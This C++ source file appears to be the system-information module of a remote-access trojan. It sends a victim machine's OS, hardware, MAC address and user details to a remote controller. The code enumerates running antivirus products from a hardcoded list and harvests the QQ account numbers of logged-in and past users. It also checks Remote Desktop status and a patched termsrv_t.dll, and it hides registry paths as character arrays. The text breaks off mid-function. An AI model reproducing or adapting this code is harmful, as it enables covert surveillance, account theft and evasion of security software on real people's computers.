// SysteminfoManager.cpp: implementation of the CSysteminfoManager class.
//
//////////////////////////////////////////////////////////////////////
#include "SysteminfoManager.h"
#include "until.h"
#include <stdlib.h>
#include <shlobj.h>
#include <tlhelp32.h>

#include <strsafe.h>
#include "tchar.h"
#include <ddraw.h>
#include <NB30.h>
#include <IPRTRMIB.h>
#include <Iphlpapi.h>    


#pragma comment(lib, "guids.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "NETAPI32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "IPHlpApi.lib")

DWORD m_dwStartMiSeconds;
DWORD m_dwStartMiSeconds1;
BOOL bFirst = TRUE;


#define BUFSIZE 256

typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);
typedef BOOL (WINAPI *PGPI)(DWORD, DWORD, DWORD, DWORD, PDWORD);

extern HMODULE hDllModule;

CSysteminfoManager::CSysteminfoManager(CClientSocket *pClient,LPCSTR lpszHost, UINT nPort) : CManager(pClient)
{

	NetPort = nPort;        //连接端口
	Linkaddress = lpszHost; //连接地址

	SendSysInfoList();
	hSendMemoryThread= MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);

	bFirst = TRUE;

}

CSysteminfoManager::~CSysteminfoManager()
{
	WaitForSingleObject(hSendMemoryThread, INFINITE);
	CloseHandle(hSendMemoryThread);
}


bool SwitchInputDesktop()
{
	
	BOOL	bRet = false;
	DWORD	dwLengthNeeded;
	
	HDESK	hOldDesktop, hNewDesktop;
	char	strCurrentDesktop[256], strInputDesktop[256];
	hOldDesktop = GetThreadDesktop(GetCurrentThreadId());
	memset(strCurrentDesktop, 0, sizeof(strCurrentDesktop));
	GetUserObjectInformation(hOldDesktop, UOI_NAME, &strCurrentDesktop, sizeof(strCurrentDesktop), &dwLengthNeeded);
	
	
	hNewDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	memset(strInputDesktop, 0, sizeof(strInputDesktop));
	GetUserObjectInformation(hNewDesktop, UOI_NAME, &strInputDesktop, sizeof(strInputDesktop), &dwLengthNeeded);
	
	if (lstrcmpi(strInputDesktop, strCurrentDesktop) != 0)
	{
		SetThreadDesktop(hNewDesktop);
		bRet = true;
	}
	CloseDesktop(hOldDesktop);
	
	CloseDesktop(hNewDesktop);
	
	
	return bRet;
}

void CSysteminfoManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	SwitchInputDesktop();

	switch (lpBuffer[0])
	{
	case COMMAND_NEXT:
		NotifyDialogIsOpen();
		break;
	default:
		break;
	}
}


void CSysteminfoManager::SendSysInfoList()
{
	LPBYTE			lpBuffer = (LPBYTE)LocalAlloc(LPTR, sizeof(tagSystemInfo)+1);
	lpBuffer[0] = TOKEN_SYSTEMINFO;	
	if(lpBuffer == NULL)
		return;
	tagSystemInfo m_SysInfo;
	GetSystemInfo(&m_SysInfo);
	memcpy(lpBuffer + 1, &m_SysInfo, sizeof(tagSystemInfo));
	Send(lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

//======================================================================================================================
// 获取操作系统版本信息
BOOL GetOSDisplayString( LPTSTR pszOS)
{
	OSVERSIONINFOEX osvi;
	SYSTEM_INFO si;
	PGNSI pGNSI;
	PGPI pGPI;
	BOOL bOsVersionInfoEx;
	DWORD dwType;

	ZeroMemory(&si, sizeof(SYSTEM_INFO));
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));

	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	bOsVersionInfoEx = GetVersionEx((OSVERSIONINFO*) &osvi);

	if(bOsVersionInfoEx == NULL ) return FALSE;

	// Call GetNativeSystemInfo if supported or GetSystemInfo otherwise.

	pGNSI = (PGNSI) GetProcAddress(
		GetModuleHandle(TEXT("kernel32.dll")), 
		"GetNativeSystemInfo");
	if(NULL != pGNSI)
		pGNSI(&si);
	else GetSystemInfo(&si);

	if ( VER_PLATFORM_WIN32_NT==osvi.dwPlatformId && 
		osvi.dwMajorVersion > 4 )
	{
		StringCchCopy(pszOS, BUFSIZE, TEXT("Microsoft "));

		// Test for the specific product.

		if ( osvi.dwMajorVersion == 6 )
		{
			if( osvi.dwMinorVersion == 0 )
			{
				if( osvi.wProductType == VER_NT_WORKSTATION )
					StringCchCat(pszOS, BUFSIZE, TEXT("Windows Vista "));
				else StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2008 " ));
			}
			else if ( osvi.dwMinorVersion == 1 )
			{
				if( osvi.wProductType == VER_NT_WORKSTATION )
					StringCchCat(pszOS, BUFSIZE, TEXT("Windows 7 "));
				else StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2008 R2 " ));
			}
			else if (osvi.dwMinorVersion == 2)
			{
				if( osvi.wProductType == VER_NT_WORKSTATION )
					StringCchCat(pszOS, BUFSIZE, TEXT("Windows 8 "));
				else StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2012 " ));
			}

			pGPI = (PGPI) GetProcAddress(
				GetModuleHandle(TEXT("kernel32.dll")), 
				"GetProductInfo");

			pGPI( osvi.dwMajorVersion, osvi.dwMinorVersion, 0, 0, &dwType);

			switch( dwType )
			{
			case PRODUCT_ULTIMATE:
				StringCchCat(pszOS, BUFSIZE, TEXT("Ultimate Edition" ));
				break;
			case PRODUCT_PROFESSIONAL:
				StringCchCat(pszOS, BUFSIZE, TEXT("Professional" ));
				break;
			case PRODUCT_HOME_PREMIUM:
				StringCchCat(pszOS, BUFSIZE, TEXT("Home Premium Edition" ));
				break;
			case PRODUCT_HOME_BASIC:
				StringCchCat(pszOS, BUFSIZE, TEXT("Home Basic Edition" ));
				break;
			case PRODUCT_ENTERPRISE:
				StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition" ));
				break;
			case PRODUCT_BUSINESS:
				StringCchCat(pszOS, BUFSIZE, TEXT("Business Edition" ));
				break;
			case PRODUCT_STARTER:
				StringCchCat(pszOS, BUFSIZE, TEXT("Starter Edition" ));
				break;
			case PRODUCT_CLUSTER_SERVER:
				StringCchCat(pszOS, BUFSIZE, TEXT("Cluster Server Edition" ));
				break;
			case PRODUCT_DATACENTER_SERVER:
				StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter Edition" ));
				break;
			case PRODUCT_DATACENTER_SERVER_CORE:
				StringCchCat(pszOS, BUFSIZE, TEXT("Datacenter Edition (core installation)" ));
				break;
			case PRODUCT_ENTERPRISE_SERVER:
				StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition" ));
				break;
			case PRODUCT_ENTERPRISE_SERVER_CORE:
				StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition (core installation)" ));
				break;
			case PRODUCT_ENTERPRISE_SERVER_IA64:
				StringCchCat(pszOS, BUFSIZE, TEXT("Enterprise Edition for Itanium-based Systems" ));
				break;
			case PRODUCT_SMALLBUSINESS_SERVER:
				StringCchCat(pszOS, BUFSIZE, TEXT("Small Business Server" ));
				break;
			case PRODUCT_SMALLBUSINESS_SERVER_PREMIUM:
				StringCchCat(pszOS, BUFSIZE, TEXT("Small Business Server Premium Edition" ));
				break;
			case PRODUCT_STANDARD_SERVER:
				StringCchCat(pszOS, BUFSIZE, TEXT("Standard Edition" ));
				break;
			case PRODUCT_STANDARD_SERVER_CORE:
				StringCchCat(pszOS, BUFSIZE, TEXT("Standard Edition (core installation)" ));
				break;
			case PRODUCT_WEB_SERVER:
				StringCchCat(pszOS, BUFSIZE, TEXT("Web Server Edition" ));
				break;
			}
		}

		if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 2 )
		{
			if( GetSystemMetrics(SM_SERVERR2) )
				StringCchCat(pszOS, BUFSIZE, TEXT( "Windows Server 2003 R2, "));
			else if ( osvi.wSuiteMask & VER_SUITE_STORAGE_SERVER )
				StringCchCat(pszOS, BUFSIZE, TEXT( "Windows Storage Server 2003"));
			else if ( osvi.wSuiteMask & VER_SUITE_WH_SERVER )
				StringCchCat(pszOS, BUFSIZE, TEXT( "Windows Home Server"));
			else if( osvi.wProductType == VER_NT_WORKSTATION &&
				si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64)
			{
				StringCchCat(pszOS, BUFSIZE, TEXT( "Windows XP Professional x64 Edition"));
			}
			else StringCchCat(pszOS, BUFSIZE, TEXT("Windows Server 2003 "));

			// Test for the server type.
			if ( osvi.wProductType != VER_NT_WORKSTATION )
			{
				if ( si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_IA64 )
				{
					if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Datacenter Edition for Itanium-based Systems" ));
					else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Enterprise Edition for Itanium-based Systems" ));
				}

				else if ( si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64 )
				{
					if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Datacenter x64 Edition" ));
					else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Enterprise x64 Edition" ));
					else StringCchCat(pszOS, BUFSIZE, TEXT( "Standard x64 Edition" ));
				}

				else
				{
					if ( osvi.wSuiteMask & VER_SUITE_COMPUTE_SERVER )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Compute Cluster Edition" ));
					else if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Datacenter Edition" ));
					else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Enterprise Edition" ));
					else if ( osvi.wSuiteMask & VER_SUITE_BLADE )
						StringCchCat(pszOS, BUFSIZE, TEXT( "Web Edition" ));
					else StringCchCat(pszOS, BUFSIZE, TEXT( "Standard Edition" ));
				}
			}
		}

		if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 1 )
		{
			StringCchCat(pszOS, BUFSIZE, TEXT("Windows XP "));
			if( osvi.wSuiteMask & VER_SUITE_PERSONAL )
				StringCchCat(pszOS, BUFSIZE, TEXT( "Home Edition" ));
			else StringCchCat(pszOS, BUFSIZE, TEXT( "Professional" ));
		}

		if ( osvi.dwMajorVersion == 5 && osvi.dwMinorVersion == 0 )
		{
			StringCchCat(pszOS, BUFSIZE, TEXT("Windows 2000 "));

			if ( osvi.wProductType == VER_NT_WORKSTATION )
			{
				StringCchCat(pszOS, BUFSIZE, TEXT( "Professional" ));
			}
			else 
			{
				if( osvi.wSuiteMask & VER_SUITE_DATACENTER )
					StringCchCat(pszOS, BUFSIZE, TEXT( "Datacenter Server" ));
				else if( osvi.wSuiteMask & VER_SUITE_ENTERPRISE )
					StringCchCat(pszOS, BUFSIZE, TEXT( "Advanced Server" ));
				else StringCchCat(pszOS, BUFSIZE, TEXT( "Server" ));
			}
		}

		// Include service pack (if any) and build number.

		if( _tcslen(osvi.szCSDVersion) > 0 )
		{
			StringCchCat(pszOS, BUFSIZE, TEXT(" ") );
			StringCchCat(pszOS, BUFSIZE, osvi.szCSDVersion);
		}

		TCHAR buf[80];

		StringCchPrintf( buf, 80, TEXT(" (build %d)"), osvi.dwBuildNumber);
		StringCchCat(pszOS, BUFSIZE, buf);

		if ( osvi.dwMajorVersion >= 6 )
		{
			if ( si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_AMD64 )
				StringCchCat(pszOS, BUFSIZE, TEXT(" 64-bit" ));
			else if (si.wProcessorArchitecture==PROCESSOR_ARCHITECTURE_INTEL )
				StringCchCat(pszOS, BUFSIZE, TEXT(" 32-bit"));
		}

		return TRUE; 
	}
	else
	{  
		printf( "This sample does not support this version of Windows.\n");
		return FALSE;
	}
}

PCHAR GetTotalPhys()
{
	CHAR *pBuf = new CHAR[20];
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	dSize = (unsigned __int64)Meminfo.ullTotalPhys;
	dSize /= 1024;
	dSize /= 1024;
	dSize += 1;
	wsprintf(pBuf, _T("%u"), dSize);
	return pBuf;
}

PCHAR GetAvailPhys()
{
	CHAR *pBuf = new CHAR[20];
	MEMORYSTATUSEX		Meminfo;
	unsigned __int64	dSize;
	memset(&Meminfo, 0, sizeof(Meminfo));
	Meminfo.dwLength = sizeof(Meminfo);
	GlobalMemoryStatusEx(&Meminfo);
	dSize = (unsigned __int64)Meminfo.ullAvailPhys;
	dSize /= 1024;
	dSize /= 1024;
	dSize += 1;
	wsprintf(pBuf, _T("%u"), dSize);
	return pBuf;
}


//=================获得当前登陆用户名及计算机名称====================
BOOL GetTokenByName(HANDLE &hToken,LPSTR lpName)
{
    if(!lpName)
	{
        return FALSE;
	}
    HANDLE         hProcessSnap = NULL; 
    BOOL           bRet      = FALSE; 
    PROCESSENTRY32 pe32      = {0}; 

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) 
        return (FALSE); 

    pe32.dwSize = sizeof(PROCESSENTRY32); 
    if (Process32First(hProcessSnap, &pe32)) 
    {
        do 
        {
			_strupr(pe32.szExeFile);
			if(!strcmp(pe32.szExeFile,lpName))
			{
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION,FALSE,pe32.th32ProcessID);
				bRet = OpenProcessToken(hProcess,TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,&hToken);
                CloseHandle (hProcessSnap); 
                return (bRet);
			}
        } 
        while (Process32Next(hProcessSnap, &pe32)); 
        bRet = TRUE; 
    } 
    else 
        bRet = FALSE;

    CloseHandle (hProcessSnap); 
    return (bRet);
}

BOOL GetCurrentUserName(char szUser[],char szDomain[])
{
    HANDLE hToken;
	
    //得到shell的token
    if(!GetTokenByName(hToken,"EXPLORER.EXE"))
	{
        return FALSE;
	}
    DWORD        cbti     = 0;
    PTOKEN_USER  ptiUser  = NULL;
    SID_NAME_USE snu;
	
    //取得所需空间大小
    if (GetTokenInformation(hToken, TokenUser, NULL, 0, &cbti)) 
	{
        CloseHandle(hToken);
        return FALSE;
	}
	
    //分配空间
    ptiUser = (PTOKEN_USER) HeapAlloc(GetProcessHeap(), 0, cbti);
	
    if(!ptiUser)
	{
        CloseHandle(hToken);
        return FALSE;
	}
	
    //取得token信息
    if (!GetTokenInformation(hToken, TokenUser, ptiUser, cbti, &cbti))
	{
        CloseHandle(hToken);
        HeapFree(GetProcessHeap(), 0, ptiUser);
        return FALSE;
	}
	
    DWORD nUser = 50;
    DWORD nDomain = 50;
	
    //根据用户的sid得到用户名和domain
    if (!LookupAccountSid(NULL, ptiUser->User.Sid, szUser, &nUser, szDomain, &nDomain, &snu))
	{
        CloseHandle(hToken);
        HeapFree(GetProcessHeap(), 0, ptiUser);
        return FALSE;
	}
	
    CloseHandle(hToken);
    HeapFree(GetProcessHeap(), 0, ptiUser);
	
    return TRUE;
}

void GetCurrentUserNamet(char szUser[])
{
	char TszUser[50]={0};
	char TszDomain[50]={0};
	if(GetCurrentUserName(TszUser,TszDomain))
	{
		wsprintf(szUser,"%s",TszUser);
	}
	else
	{
		wsprintf(szUser,"%s","无用户登陆状态！");
	}
}

UINT GetPort(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("PortNumber"), REG_DWORD, (char *)lpBuffer, NULL, uSize, 0);
	if (lstrlen(lpBuffer) == 0)
	{
		lpBuffer = _T("3389");
	}
	return lstrlen(lpBuffer);
}

HANDLE FindModule(DWORD dwProcessID, LPCTSTR lpModulePath)
{
	HANDLE hModuleHandle = NULL;
	MODULEENTRY32 me32 = {0};
	HANDLE hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessID);
	me32.dwSize = sizeof(MODULEENTRY32);
	if(::Module32First(hModuleSnap, &me32))
	{
		do
		{	
			if (lstrcmpi(me32.szExePath, lpModulePath) == 0)
			{
				hModuleHandle = me32.hModule;
				break;
			}
		}while(::Module32Next(hModuleSnap,&me32));
	}
	::CloseHandle(hModuleSnap);
	return hModuleHandle;
}


/////////////////杀毒显示//////////////////////////////////
typedef struct
{
	char *Course;
	char *Name;
}AYSDFE77;


AYSDFE77 g_Ayadfe_Datas77[40] =
{
	{"360tray.exe",       "360安全卫士"},
	{"360sd.exe",         "360杀毒"},
	{"kxetray.exe",       "金山毒霸"},
	{"KSafeTray.exe",     "金山安全卫士"},
	{"QQPCRTP.exe",       "QQ电脑管家"},
	{"BaiduSd.exe",       "百度杀毒"},
	{"baiduSafeTray.exe", "百度卫士"},
	{"KvMonXP.exe",       "江民"},
	{"RavMonD.exe",       "瑞星"},
	{"QUHLPSVC.EXE",      "QuickHeal"},//印度
	{"mssecess.exe",      "微软MSE"},
	{"cfp.exe",           "Comodo杀毒"},
	{"SPIDer.exe",        "DR.WEB"},//大蜘蛛
	{"acs.exe",           "Outpost"},
	{"V3Svc.exe",         "安博士V3"},
	{"AYAgent.aye",       "韩国胶囊"},
	{"avgwdsvc.exe",      "AVG"},
	{"f-secure.exe",      "F-Secure"},//芬安全
	{"avp.exe",           "卡巴"},
	{"Mcshield.exe",      "麦咖啡"},
	{"egui.exe",          "NOD32"},
	{"knsdtray.exe",      "可牛"},
	{"TMBMSRV.exe",       "趋势"},
	{"avcenter.exe",      "小红伞"},
	{"ashDisp.exe",       "Avast网络安全"}, 
	{"rtvscan.exe",       "诺顿"}, 
	{"remupd.exe",        "熊猫卫士"},
	{"vsserv.exe",        "BitDefender"},//BD  bdagent.exe
	{"PSafeSysTray.exe",  "PSafe反病毒"},//巴西
	{"ad-watch.exe",      "Ad-watch反间谍"}, 
	{"K7TSecurity.exe",   "K7杀毒"}, 
	{"UnThreat.exe",      "UnThreat"},//保加利亚
	{"  ",    "  "}
	
};

char* GetVirus77()
{	
	static char AllName[1024];
	int t=0;
	memset(AllName, 0, sizeof(AllName));
	while(1)
	{
		if (strstr(g_Ayadfe_Datas77[t].Course, " " )  == 0 )
		{	
			if (GetProcessID(g_Ayadfe_Datas77[t].Course)) 
			{
				lstrcat( AllName, g_Ayadfe_Datas77[t].Name);
				lstrcat( AllName, " " );
			}
		}
		else
			break;
		t++;
	}
	
	if (strstr(AllName, " " )  == 0 )
	{	
		lstrcat(AllName , "NULL");
	}
	
	return AllName;
}

/////////////////
char *GetQQ()
{
	char *szQQNum = new char[2048];
	memset(szQQNum, 0, 260);
	char szText[2048] = {0};
    char szQQNumber[2048] = {0};
    HWND hWnd = FindWindowA("CTXOPConntion_Class", NULL);
	
	while (hWnd)
	{
		char szClassName[MAX_PATH] = {0};
		GetClassName(hWnd, szClassName, MAX_PATH);
		if (strcmp(szClassName, "CTXOPConntion_Class") == 0)
		{	
			// 得到类似OP_12345678的字符串
			if (hWnd)
			{
				GetWindowText(hWnd, szText, MAX_PATH);
			}
			// 得到12345678 qq号
			int len = strlen(szText);
			do
			{
				len--;
			} while (szText[len] != '_');
			strcpy(szQQNumber, &szText[len+1]);
			if (lstrlen(szQQNum) != 0)
			{	
				strcat(szQQNum, "|");
			}
			strcat(szQQNum, szQQNumber);
		}
		hWnd = GetWindow(hWnd, GW_HWNDNEXT);
	}
	if (lstrlen(szQQNum) == 0)
	{
		strcpy(szQQNum, "NULL");
	}
	return szQQNum;
}
void GetLocalQQNum(char szQQNum1[1024])
{
	
	TCHAR pathBuffer[MAX_PATH] = {0};
    SHGetSpecialFolderPath(NULL, pathBuffer, CSIDL_APPDATA, FALSE);
	TCHAR strPath[MAX_PATH]={0};
	strcpy(strPath,pathBuffer);
	strcat(strPath,"\\Tencent\\Users\\*.*");
    HANDLE hFile;
    WIN32_FIND_DATA fileData;
    hFile = FindFirstFile(strPath, &fileData);
    FindNextFile(hFile, &fileData);
	int i = 0;
    while (FindNextFile(hFile, &fileData))
    {
        // 如果是一个文件夹目录
        if(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
        {
			
			strcat(fileData.cFileName,"| ");
			memcpy(szQQNum1+i,fileData.cFileName,strlen(fileData.cFileName));
			i+=strlen(fileData.cFileName);	
        }
    }
}

///////////////////

typedef struct _ASTAT_
{
	ADAPTER_STATUS  adapt;
    NAME_BUFFER  NameBuff[30];
}ASTAT,*PASTAT;
ASTAT Adapter;
int getMAC(char * mac)     
{     
	NCB ncb;     
    LANA_ENUM lana_enum;
    UCHAR uRetCode;
    memset(&ncb, 0, sizeof(ncb));
    memset(&lana_enum, 0, sizeof(lana_enum));
    ncb.ncb_command = NCBENUM;
    ncb.ncb_buffer = (unsigned char *)&lana_enum;
    ncb.ncb_length = sizeof(LANA_ENUM);
    uRetCode = Netbios(&ncb);
    if(uRetCode != NRC_GOODRET)     
		return uRetCode;     
    for(int lana=0; lana<lana_enum.length; lana++)     
	{
		ncb.ncb_command = NCBRESET;
        ncb.ncb_lana_num = lana_enum.lana[lana];
        uRetCode = Netbios(&ncb);
        if(uRetCode == NRC_GOODRET)
			break; 
    } 
    if(uRetCode != NRC_GOODRET)
		return uRetCode;     
    memset(&ncb, 0, sizeof(ncb));
    ncb.ncb_command = NCBASTAT;
    ncb.ncb_lana_num = lana_enum.lana[0];
	strcpy((char*)ncb.ncb_callname, "*");
    ncb.ncb_buffer = (unsigned char *)&Adapter;
    ncb.ncb_length = sizeof(Adapter);
    uRetCode = Netbios(&ncb);
    if(uRetCode != NRC_GOODRET)
		return uRetCode;
    wsprintf(mac,"%02X-%02X-%02X-%02X-%02X-%02X",
		Adapter.adapt.adapter_address[0],
		Adapter.adapt.adapter_address[1],
		Adapter.adapt.adapter_address[2],
		Adapter.adapt.adapter_address[3],
		Adapter.adapt.adapter_address[4],
		Adapter.adapt.adapter_address[5]);
	return 0;   
} 


 

void CSysteminfoManager::GetSystemInfo(tagSystemInfo* pSysInfo)
{
	ZeroMemory(pSysInfo,sizeof(tagSystemInfo));


	CHAR pszOS[MAX_PATH];
	if (GetOSDisplayString(pszOS))
	{
		wsprintf(pSysInfo->szSystemName, pszOS);
	}
	else
	{
		strcpy(pSysInfo->szSystemName,"NULL");
	}
	
	//////////////CPU Speed/////////////////
	DWORD dwCpu, dwBufLen;
	HKEY hKey;
	char JYvni02[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0'};
	RegOpenKeyEx( HKEY_LOCAL_MACHINE,
		JYvni02,
		0, KEY_QUERY_VALUE, &hKey );
	dwBufLen = sizeof(DWORD);
	RegQueryValueEx( hKey, ("~MHz"), NULL, NULL,(LPBYTE)&dwCpu, &dwBufLen);
	RegCloseKey(hKey);
	wsprintf(pSysInfo->szCpuSpeend,("~%u MHz"), dwCpu);

	//Get CPU Info===============================
	//获取CPU信息===============================
	if(
		!ReadRegEx
		(
		HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\0", 
		"ProcessorNameString",
		REG_SZ, 
 		pSysInfo->szCpuInfo, 
		NULL,
		lstrlen(pSysInfo->szCpuInfo),
		0)
		)
		strcpy(pSysInfo->szCpuInfo,"Find CPU infomation error");



	// 内存
	pSysInfo->szMemory = atol(GetTotalPhys());
	
	// 可用内存
	pSysInfo->szMemoryFree = atol(GetAvailPhys());


	ULARGE_INTEGER nTotalBytes,nTotalFreeBytes,nTotalAvailableBytes;
	ULONG nAllGB = 0, nFreeGB = 0;
    DWORD drivertype;
    CHAR driver[10], strPrint[128];
    for(int i=0; i<26; i++)
    {
		driver[0] = i + ('B');
		driver[1] = (':');
		driver[2] = ('\\');
		driver[3] = 0;
		
		drivertype = GetDriveType(driver);
        if(drivertype!=DRIVE_FIXED)
			continue;
		GetDiskFreeSpaceEx(driver,&nTotalAvailableBytes,&nTotalBytes,&nTotalFreeBytes);   
		nAllGB = nAllGB + nTotalBytes.QuadPart/1024/1024/1024;
		nFreeGB = nFreeGB + nTotalFreeBytes.QuadPart/1024/1024/1024;
    }
	// 硬盘
	pSysInfo->szDriveSize = nAllGB;
	// 可用硬盘
	pSysInfo->szDriveFreeSize = nFreeGB;


	//获取当前用户名及计算机名称
	GetCurrentUserNamet(pSysInfo->szUserName);

	//Get Screen Size=================================
	wsprintf(pSysInfo->szScrSize, ("%d * %d"), GetSystemMetrics(SM_CXSCREEN),GetSystemMetrics(SM_CYSCREEN));

	//Get Active Time============================
	DWORD dwTime,dwDay,dwHour,dwMin;
	dwTime = GetTickCount();
	dwDay = dwTime / (1000 * 60 * 60 * 24);
	dwTime = dwTime % (1000 * 60 * 60 * 24);
	dwHour = dwTime / (1000 * 60 * 60);
	dwTime = dwTime % (1000 * 60 * 60);
	dwMin = dwTime / (1000 * 60);
	_stprintf(pSysInfo->szActiveTime, _T("%dDay %dHour %dMin"), dwDay,dwHour,dwMin);

	//Get AntiVirus & FireWall========================
	strcpy( pSysInfo->szUserVirus, GetVirus77() );

	strcpy(pSysInfo->szQq,GetQQ());
	//历史QQ
	GetLocalQQNum(pSysInfo->szQQNums);


	char mac[200];
    getMAC(mac);   
	//MAC
	strcpy( pSysInfo->szMac, mac);
	//显卡
	if(
		!ReadRegEx
		(
		HKEY_LOCAL_MACHINE, 
		"SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", 
		"DriverDesc",
		REG_SZ, 
		pSysInfo->szGraphics, 
		NULL,
		lstrlen(pSysInfo->szGraphics),
		0)
		)
		strcpy(pSysInfo->szGraphics,"NULL");

	//显存
	LPDIRECTDRAW2 lpdd;
	HRESULT ddrval;
	
	CoInitialize(NULL);	
	
	ddrval = CoCreateInstance(CLSID_DirectDraw,
		NULL, CLSCTX_ALL, IID_IDirectDraw2, (void**)&lpdd);
	
	
	if(!FAILED(ddrval))
	{
		ddrval = IDirectDraw2_Initialize(lpdd, NULL);
	}
	
	DDCAPS ddcaps;
	ddcaps.dwSize = sizeof DDCAPS;
	lpdd->GetCaps(&ddcaps, NULL);
	
	lpdd->Release();
	
	DWORD dwMem = ddcaps.dwVidMemTotal;
	
	int iMem = dwMem/1008/1008;
	
	pSysInfo->Memory7 = iMem;


	pSysInfo->LinePort = NetPort;
	strcpy(pSysInfo->LineName,Linkaddress);


	// 服务端位置和服务端大小
	char	szDatPath[MAX_PATH];
	DWORD    dwFileSize = 0;
	GetModuleFileName(hDllModule,szDatPath,sizeof(szDatPath));
	HANDLE handle = CreateFile(szDatPath, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
	if (handle != INVALID_HANDLE_VALUE)
	{
		dwFileSize = GetFileSize(handle, NULL)  / 1024;
		CloseHandle(handle);
	}
	wsprintf(pSysInfo->Program,"%s (文件大小: %d KB)",szDatPath,dwFileSize);

	//系统目录
	GetSystemDirectory((LPTSTR)(LPCTSTR)pSysInfo->szSystemdire,50);

	////////////////////////////3389//////////////////////////
	//读取远程端口
	GetPort(_T("RDP-Tcp"),pSysInfo->szRemotePort,sizeof(pSysInfo->szRemotePort));
	//3389状态
	TCHAR szSystem[32], szDllName[MAX_PATH];
	SC_HANDLE hSCManager, schService;
	SERVICE_STATUS   ssStatus;
	hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (hSCManager == NULL)
	{
		wsprintf(pSysInfo->szOpenInfo, _T("OpenSCManager Error!"));
		return;
	}
	schService = OpenService( hSCManager, _T("TermService"), SERVICE_ALL_ACCESS);
	if(schService   ==   NULL)
	{
		wsprintf(pSysInfo->szOpenInfo, _T("OpenService Error!"));
		return;
	}
	if (!QueryServiceStatus(schService, &ssStatus))
	{	
		CloseServiceHandle(schService);
		CloseServiceHandle(hSCManager);
		wsprintf(pSysInfo->szOpenInfo, _T("QueryServiceStatus Error!"));
		return;
	}
	CloseServiceHandle(schService);
	CloseServiceHandle(hSCManager);
	if (ssStatus.dwCurrentState == SERVICE_RUNNING)
	{
		TCHAR szCanConnect[32];
		ReadRegEx(HKEY_LOCAL_MACHINE, _T("SYSTEM\\CurrentControlSet\\Control\\Terminal Server"), 
			_T("fDenyTSConnections"), REG_DWORD, szCanConnect, NULL, NULL, 0);
		if (atoi(szCanConnect) == 0)
		{
			if(_tcscmp(szSystem, _T("Win XP")) == 0)
			{
				//HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService\Parameters
				char MvrIy[] = {'S','Y','S','T','E','M','\\','C','u','r','r','e','n','t','C','o','n','t','r','o','l','S','e','t','\\','S','e','r','v','i','c','e','s','\\','T','e','r','m','S','e','r','v','i','c','e','\\','P','a','r','a','m','e','t','e','r','s','\0'};
				ReadRegEx(HKEY_LOCAL_MACHINE, _T(MvrIy), 
					_T("ServiceDll"), REG_EXPAND_SZ, szDllName, NULL, NULL, 0);
				if (_tcsstr(szDllName, _T("termsrv_t")) != 0)
				{
					PROCESSENTRY32 pe32;
					pe32.dwSize = sizeof(pe32);
					TCHAR strDll[MAX_PATH];
					BOOL bRet = FALSE;
					GetSystemDirectory(strDll, sizeof(strDll));
					lstrcat(strDll, _T("\\termsrv_t.dll"));
					DebugPrivilege(SE_DEBUG_NAME, TRUE);
